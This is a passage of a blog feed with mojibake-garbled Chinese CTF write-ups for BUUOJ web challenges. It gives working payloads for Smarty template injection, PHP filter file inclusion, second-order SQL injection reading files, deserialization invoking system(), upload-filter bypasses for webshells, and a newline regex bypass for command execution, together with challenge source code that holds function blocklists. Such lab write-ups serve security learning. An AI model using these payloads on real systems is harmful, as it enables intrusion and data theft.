åä¸œå—èµ›åŒº]Web11</h2><blockquote><p>è€ƒç‚¹ï¼šsstiæ¨¡æ¿æ³¨å…¥</p></blockquote><p>æ‰“å¼€é¡µé¢å‘ç°é¡µé¢ä¼šè®°å½•IPåœ°å€ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°å­˜åœ¨XFFå¤´æ³¨å…¥ï¼Œåˆçœ‹åˆ°æç¤ºSmarty,æ˜¯æ¨¡æ¿æ³¨å…¥äº†ï¼ŒæŠ“åŒ…ç„¶åæµ‹è¯•ï¼š<br><img src="/images/20200724011948.png" alt=""><br>å½“è¾“å…¥{1+1}çš„æ—¶å€™ï¼Œæ˜¾ç¤º2ã€‚çœ‹äº†çœ‹åˆ«äººçš„writeupï¼Œ<br>smartyä¸­çš„{if}æ ‡ç­¾ä¸­å¯ä»¥æ‰§è¡Œphpè¯­å¥ï¼Œå¾—flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/20200724012403.png" alt=""></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«</p></blockquote><p>è¿›å…¥é¡µé¢ä¸¤ä¸ªæŒ‰é’®ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªï¼Œå‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°urlå˜æˆäº†è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn&#x2F;index.php?category&#x3D;woofers</span><br></pre></td></tr></table></figure><p>æŠŠwoofersæ”¹ä¸ºindexå‘ç°ä¸è¡Œï¼Œç„¶åæ”¹ä¸º<code>index woofer</code>å‡ºç°æŠ¥é”™ä¿¡æ¯ï¼š<br><img src="/images/20200724012928.png" alt=""><br>å¯ä»¥å‘ç°includeè¯­å¥æ˜¯è¿™æ ·çš„ï¼Œè·å–urlä¸­çš„categoryå‚æ•°ç„¶åæ‹¼æ¥<code>.php</code>ï¼Œç„¶ååŒ…å«è¿™ä¸ªphpæ–‡ä»¶ï¼Œå°è¯•ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure><p>base64è§£ç å¾—åˆ°index.phpæºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#39;.php&#39;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¸­å¿…é¡»åŒ…å«<code>index,woofers,meowers</code>ä¸­çš„ä¸€ä¸ªï¼Œç„¶åè¿™æ ·åˆšå¥½è¯»åˆ°flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>è¿™é“é¢˜çœŸå‘å•Šï¼Œè¿›é¡µé¢æ˜¯å‡ ä¸ªè¾“å…¥æ¡†ï¼Œå„ç§æäº¤ï¼ŒæŸ¥è¯¢ï¼Œä¿®æ”¹ï¼Œåˆ é™¤çš„åŠŸèƒ½ï¼Œç„¶åæˆ‘åœ¨æŸ¥è¯¢é‚£é‡Œè¯•äº†åŠå¤©ï¼Œè¯•å‡ºä¸€ä¸ªå¼‚æˆ–æ³¨å…¥ï¼Œçˆ†å‡ºæ•°æ®åº“ååï¼Œæ²¡æƒ³åˆ°æŸ¥è¡¨å¾—æ—¶å€™å‘ç°selectä»€ä¹ˆçš„éƒ½ç»™banäº†ï¼Œä¹Ÿæ²¡æ³•ç»•è¿‡ï¼Œç»“æœæ²¡åŠæ³•ï¼Œåªèƒ½æ‰¾å…¶ä»–æ–¹æ³•äº†ã€‚</p><p>åœ¨ä¸»é¡µæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®è¯»å–åˆ°æ‰€æœ‰æ–‡ä»¶çš„æºç ï¼Œæºç å°±ä¸ä¸€ä¸€æ”¾å‡ºæ¥äº†ï¼Œçœ‹ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;confirm.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">&#x2F;&#x2F;var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg &#x3D; $user_name.&quot;å·²æäº¤è®¢å•&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re &#x3D; $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;è®¢å•æäº¤æˆåŠŸ&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg &#x3D; &quot;ä¿¡æ¯ä¸å…¨&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œå¯¹ä¼ å…¥çš„<code>user_name</code>å’Œ<code>phone</code>è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†æ˜¯å¯¹```address``å´æ²¡æœ‰åšè¿‡æ»¤ï¼Œå†çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;change.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;ä¿¡æ¯ä¸å…¨&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹åˆšåˆšä¼ å…¥çš„addresså‚æ•°æ²¡æœ‰åšä»»ä½•å¤„ç†å°±æ”¾è¿›äº†æ•°æ®è¡¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨åŸå§‹ä¼ å…¥å¸¦æœ‰sqlæ³¨å…¥çš„addresså‚æ•°ï¼Œç„¶ååœ¨è¿™ä¸ªé¡µé¢å‘èµ·è¯·æ±‚ï¼Œé‚£ä¸ªsqlè¯­å¥å°±ä¼šè¢«è§¦å‘ï¼Œç„¶åå°±å¯ä»¥æˆåŠŸæ‰§è¡Œsqlæ³¨å…¥ã€‚<br>æ€è·¯æœ‰äº†ä»¥åï¼Œæ„é€ payload,è¿™é‡Œç”¨çš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»å–æ˜¾ç¤ºä¸å…¨ï¼Œåˆ†ä¸¤æ®µè¯»å–payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¾—åˆ°flagäº†ã€‚</p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb&quot;&gt;&lt;a href=&quot;#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb&quot;&gt;&lt;/a&gt;[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;è€ƒç‚¹ï¼šç›²æ³¨ï¼Œæ–‡ä»¶ä¸Šä¼ &lt;br&gt;æŸ¥çœ‹robots.txtï¼š&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>buuoj åˆ·é¢˜è®°å½•ï¼ˆä¸€ï¼‰</title>
    <link href="http://yoursite.com/2020/07/13/buuoj_01/"/>
    <id>http://yoursite.com/2020/07/13/buuoj_01/</id>
    <published>2020-07-13T12:30:32.000Z</published>
    <updated>2020-08-01T01:44:27.806Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><a id="more"></a><p>æŠ“åŒ…</p><p><img src="/images/20200723201821.png" alt=""></p><p>dateæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œåé¢çš„påº”è¯¥æ˜¯å®ƒçš„å‚æ•°ï¼ŒçŒœæµ‹ä½¿ç”¨äº†call_user_func(å‡½æ•°åï¼Œå‚æ•°)å‡½æ•°<br>ä½¿ç”¨ <code>func=readfile&amp;p=index.php</code> è¯»å–æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,</span><br><span class="line">  &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,</span><br><span class="line">  &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,</span><br><span class="line">  &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,</span><br><span class="line">  &quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,</span><br><span class="line">  &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">  &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,</span><br><span class="line">  &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,</span><br><span class="line">  &quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result &#x3D; call_user_func($func, $p);</span><br><span class="line">    $a&#x3D; gettype($result);</span><br><span class="line">    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œçœ‹åˆ°æœ‰ <strong>__destruct()</strong> å‡½æ•°ï¼Œå°è¯•æ„é€ ååºåˆ—åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;p &#x3D; &#39;find &#x2F; -name flag*&#39;;</span><br><span class="line">$a-&gt;p &#x3D; &#39;cat &#x2F;tmp&#x2F;flagoefiu4r93&#39;;</span><br><span class="line"></span><br><span class="line">$a-&gt;func &#x3D; &#39;system&#39;;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾flagæ–‡ä»¶<br><img src="/images/20200724003619.png" alt=""></p><p>è¯»å–flag<br><img src="/images/20200724003709.png" alt=""></p><h2 id="MRCTF2020-ä½ ä¼ ä½ maå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ maå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ maå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ maå‘¢</h2><p>åˆ©ç”¨BurpSuiteä¿®æ”¹MIMEæ¬ºéª—åç«¯æ–‡ä»¶ç±»å‹ ä¿®æ”¹ Content-Type: image/png ç„¶åå°±å¯ä»¥ä¼ ä»»æ„æ–‡ä»¶åç¼€ åˆ©ç”¨.htaccessæ¥åˆ¶ä½œå›¾ç‰‡é©¬</p><p>å¢åŠ ä½¿ç”¨phpè§£æçš„æ–‡ä»¶åç¼€(.jpg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p><img src="/images/20200724003759.png" alt=""></p><p>ç„¶åå†å†™ä¸ªä¸€å¥è¯ï¼Œè¿ä¸Šèšå‰‘å³å¯</p><p><img src="/images/20200724003852.png" alt=""></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>ç»•è¿‡åç¼€åæ£€éªŒï¼š<code>phpã€php3ã€php5ã€php7ã€phtã€phtml</code><br>æ–‡ä»¶å¤´åŠ å…¥ <code>GIF89a</code><br>ä¿®æ”¹ <code>Content-Type: image/jpeg</code><br>å¯è§£æä¸ºphpçš„æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">&lt;?&#x3D; phpinfo(); ?&gt;</span><br><span class="line">&lt;script language&#x3D;php&gt;phpinfo();&lt;&#x2F;script&gt;    &#x2F;&#x2F;php7ç§»é™¤</span><br><span class="line">&lt;? phpinfo(); ?&gt;    &#x2F;&#x2F;éœ€è¦php.iniä¸­short_open_tag&#x3D;On</span><br><span class="line">&lt;% phpinfo(); %&gt;    &#x2F;&#x2F;éœ€è¦php.iniä¸­asp_tags &#x3D; On  php7ç§»é™¤</span><br></pre></td></tr></table></figure><p>phpç‰ˆæœ¬æ˜¯5.5.9ï¼Œç”¨ç¬¬ä¸‰ä¸ª<br>ä¸Šä¼ ä¹‹åè¿æ¥èšå‰‘å³å¯</p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;cmd&#39;])) &#123;</span><br><span class="line">  $json &#x3D; $_REQUEST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];</span><br><span class="line">    if ($cmd !&#x3D;&#x3D; NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#39;Invalid input&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦såŒ¹é…å¤šè¡Œï¼Œè¿™é‡Œç›´æ¥ç”¨<code>%0A</code>æ¢è¡Œç¬¦ç»•è¿‡æ­£åˆ™payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Linuxå‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p></blockquote><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </p></blockquote><p>åˆ©ç”¨<strong>.user.ini</strong>æ„é€ 